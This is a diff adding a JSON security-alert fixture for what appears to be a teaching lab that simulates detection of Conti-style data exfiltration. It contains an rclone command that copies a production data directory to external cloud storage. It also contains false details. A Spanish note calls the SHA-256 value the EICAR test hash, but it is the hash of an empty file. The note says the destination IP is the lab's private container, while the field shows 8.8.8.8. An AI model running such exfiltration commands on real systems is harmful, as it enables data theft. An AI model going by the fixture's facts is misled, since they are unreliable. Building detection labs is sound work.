@@ -1,0 +1,33 @@
+{
+  "rule": {
+    "id": "100010",
+    "level": 12,
+    "description": "Anomalous outbound transfer detected: rclone process to external cloud storage endpoint",
+    "mitre": {
+      "id": ["T1567.002"],
+      "tactic": ["Exfiltration"],
+      "technique": ["Exfiltration to Cloud Storage"]
+    }
+  },
+  "agent": {
+    "name": "wms-db-srv01",
+    "id": "__VICTIM_HOST_AGENT_ID__",
+    "ip": "__VICTIM_HOST_IP__"
+  },
+  "data": {
+    "srcuser": "testuser",
+    "process_name": "rclone",
+    "process_cmdline": "rclone copy /data/wms_prod s3:corp-backups-eu-west-1 --transfers 16",
+    "dst_ip": "8.8.8.8",
+    "dst_domain": "s3.amazonaws.com",
+    "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "bytes_transferred": 2210331200
+  },
+  "context": {
+    "attack": "Conti ransomware (Linux variant)",
+    "kill_chain_phase": "Exfiltration",
+    "source_report": "CISA AA21-265A / Trend Micro / Mandiant / Conti Leaks 2022",
+    "note": "IOCs de ejemplo con fines académicos. El hash es el del archivo de prueba EICAR (estándar de la industria antivirus, benigno pero detectado por prácticamente todos los motores en VirusTotal) — se usa para que el nodo de enriquecimiento tenga un resultado 'malicioso' real y reproducible sin manejar malware de verdad. dst_ip ahora SÍ es infraestructura real del laboratorio: se resuelve (ver send_alert.py) a la IP del propio contenedor c2-target, el destino de exfiltración esperado dentro de este entorno — por eso no se usa una IP maliciosa de internet, que además AbuseIPDB no podría puntuar al ser una IP privada (RFC1918)."
+  },
+  "timestamp": "2026-07-15T03:14:22Z"
+}
